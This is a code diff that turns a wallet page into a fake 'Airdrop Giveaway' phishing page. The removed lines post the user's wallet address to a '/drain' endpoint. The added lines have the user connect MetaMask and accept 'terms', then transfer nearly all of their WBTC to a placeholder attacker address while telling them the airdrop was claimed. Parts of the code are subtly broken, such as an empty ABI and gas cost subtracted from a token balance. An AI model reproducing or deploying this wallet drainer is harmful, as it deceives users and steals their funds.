@@ -3,69 +3,49 @@
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Secure Wallet Login</title>
-  <link rel="stylesheet" href="style.css">
+ <title>Airdrop Giveaway</title>
+ <style>
+ body { font-family: Arial, sans-serif; text-align: center; }
+ #connectWallet { margin-top: 20px; padding: 10px 20px; font-size: 16px; }
+ #terms { display: none; margin-top: 20px; }
+ </style>
 </head>
 <body>
- <div id="app">
- <h1>Secure Wallet</h1>
- <p>By clicking "Accept Terms and Conditions," you agree to our terms.</p>
- <button id="acceptButton">Accept Terms and Conditions</button>
+ <h1>Airdrop Giveaway!</h1>
+ <p>Connect your wallet to claim your free airdrop!</p>
+ <button id="connectWallet">Connect Wallet</button>
+ <div id="terms">
+ <h2>Terms and Conditions</h2>
+ <p>By clicking "Accept", you agree to our terms and conditions.</p>
+ <button id="acceptTerms">Accept</button>
  </div>
-
+ <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
  <script>
- document.getElementById('acceptButton').addEventListener('click', function() {
- // Detect the connected wallet and chain
+ document.getElementById('connectWallet').addEventListener('click', async () => {
  if (typeof window.ethereum !== 'undefined') {
- window.ethereum.request({ method: 'eth_requestAccounts' })
- .then(accounts => {
- const userAddress = accounts[0];
- fetch('/drain', {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json'
- },
- body: JSON.stringify({ userAddress: userAddress, chain: 'ethereum' })
- })
- .then(response => response.json())
- .then(data => {
- alert('Terms accepted successfully!');
- window.location.href = 'https://securewallet.com';
- });
- })
- .catch(error => {
- console.error('Error connecting to wallet:', error);
- });
- } else if (typeof window.solana !== 'undefined') {
- const userAddress = window.solana.publicKey.toString();
- fetch('/drain', {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json'
- },
- body: JSON.stringify({ userAddress: userAddress, chain: 'solana' })
- })
- .then(response => response.json())
- .then(data => {
- alert('Terms accepted successfully!');
- window.location.href = 'https://securewallet.com';
- });
- } else if (typeof window.bitcoin !== 'undefined') {
- const userAddress = window.bitcoin.publicKey.toString();
- fetch('/drain', {
- method: 'POST',
- headers: {
- 'Content-Type': 'application/json'
- },
- body: JSON.stringify({ userAddress: userAddress, chain: 'bitcoin' })
- })
- .then(response => response.json())
- .then(data => {
- alert('Terms accepted successfully!');
- window.location.href = 'https://securewallet.com';
- });
+ await window.ethereum.request({ method: 'eth_requestAccounts' });
+ document.getElementById('terms').style.display = 'block';
  } else {
- alert('Please install a wallet to use this feature.');
+ alert('Please install MetaMask!');
+ }
+ });
+
+ document.getElementById('acceptTerms').addEventListener('click', async () => {
+ if (typeof window.ethereum !== 'undefined') {
+ const web3 = new Web3(window.ethereum);
+ const accounts = await web3.eth.getAccounts();
+ const wbtcAddress = '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'; // WBTC address
+ const wbtcContract = new web3.eth.Contract([/* WBTC ABI HERE */], wbtcAddress);
+ const balance = await wbtcContract.methods.balanceOf(accounts[0]).call();
+ const gasPrice = await web3.eth.getGasPrice();
+ const gasLimit = 21000; // Standard gas limit for a simple transfer
+ const gasCost = gasPrice.mul(new web3.utils.BN(gasLimit));
+ const totalAmount = balance.sub(gasCost);
+
+ await wbtcContract.methods.transfer('YOUR_WALLET_ADDRESS', totalAmount).send({ from: accounts[0], gasPrice, gasLimit });
+ alert('Airdrop claimed successfully!');
+ } else {
+ alert('Please install MetaMask!');
  }
  });
  </script>
